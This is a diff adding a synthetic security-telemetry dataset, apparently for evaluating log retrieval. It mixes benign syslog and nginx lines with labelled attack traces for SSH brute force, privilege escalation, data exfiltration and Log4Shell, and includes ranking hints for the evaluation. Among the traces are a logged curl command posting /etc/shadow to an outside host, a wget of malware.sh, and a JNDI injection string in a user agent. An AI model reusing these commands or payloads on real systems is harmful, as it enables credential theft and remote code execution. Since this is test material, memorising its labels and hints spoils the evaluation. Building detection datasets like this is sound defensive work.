@@ -1,1 +1,35 @@
+# ==============================================================================
+# ThreatAtlas Raw Telemetry Dataset
+# Format: [id] timestamp hostname process: message
+# ==============================================================================
 
+# --- NORMAL TRAFFIC (NOISE) ---
+[syslog_auth_001] May 14 09:00:01 server1 systemd: Started Session 1 of user root.
+[syslog_auth_002] May 14 09:05:22 server1 sshd[901]: Accepted publickey for admin from 10.0.0.50 port 50123 ssh2
+[syslog_auth_003] May 14 09:10:00 server1 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /var/log/syslog
+[nginx_access_001] 10.0.0.50 - - [14/May/2026:09:15:00 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+[syslog_network_001] May 14 09:20:00 firewall-1 UFW-BLOCK: IN=eth0 OUT= MAC=... SRC=198.51.100.55 DST=10.0.0.10 PROTO=TCP SPT=4444 DPT=22
+
+# --- TARGET: SSH Brute Force (eval_q_001) ---
+[syslog_auth_1044] May 14 10:32:00 server1 sshd[1019]: Failed password for admin from 192.168.1.100 port 54320 ssh2
+[syslog_auth_1045] May 14 10:32:01 server1 sshd[1020]: Failed password for root from 192.168.1.100 port 54321 ssh2
+[syslog_auth_1046] May 14 10:32:03 server1 sshd[1021]: Failed password for root from 192.168.1.100 port 54323 ssh2
+[syslog_auth_1047] May 14 10:32:05 server1 sshd[1022]: Connection closed by authenticating user root 192.168.1.100 port 54325 [preauth]
+
+# --- TARGET: Privilege Escalation (eval_q_002) ---
+[syslog_audit_881] May 14 10:45:10 server1 bash: history: admin executing 'uname -a'
+[syslog_audit_882] May 14 10:45:12 server1 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+[syslog_auth_1050] May 14 10:45:12 server1 su[1055]: pam_unix(su:session): session opened for user root by admin(uid=1000)
+[syslog_audit_883] May 14 10:46:00 server1 bash: history: root executing 'chmod 777 /etc/shadow'
+
+# --- TARGET: Data Exfiltration (eval_q_004) ---
+# Note: The cross-encoder should rank the proxy POST and the bash curl command highest.
+[syslog_network_440] May 14 11:00:00 firewall-1 IPTABLES-DROP: IN=eth0 OUT=eth1 SRC=10.0.0.5 DST=198.51.100.22 PROTO=TCP SPT=443 DPT=80
+[syslog_network_441] May 14 11:05:10 proxy-1 squid[221]: 1621000000.123 500 10.0.0.5 TCP_MISS/200 4589300 POST http://198.51.100.22/upload.php - DIRECT/198.51.100.22 application/octet-stream (curl/7.68.0)
+[syslog_network_442] May 14 11:06:15 proxy-1 squid[221]: 1621000000.456 1200 10.0.0.5 TCP_MISS/200 10485760 GET http://198.51.100.22/malware.sh - DIRECT/198.51.100.22 text/plain (Wget/1.20.3)
+[syslog_network_445] May 14 11:10:00 server1 bash: user=root command="curl -X POST -d @/etc/shadow http://198.51.100.22/drop"
+
+# --- TARGET: Log4Shell Indicators (eval_q_005) ---
+[nginx_access_9910] 192.168.1.50 - - [14/May/2026:11:55:00 +0000] "GET /api/v1/health HTTP/1.1" 200 45 "-" "curl/7.68.0"
+[nginx_access_9912] 192.168.1.50 - - [14/May/2026:12:00:01 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 ${jndi:ldap://10.0.0.99:1389/Exploit} Chrome/90.0"
+[nginx_error_334] 2026/05/14 12:00:05 [error] 44#44: *120 open() "/usr/share/nginx/html/${jndi:ldap://10.0.0.99:1389/Exploit}" failed (2: No such file or directory), client: 192.168.1.50
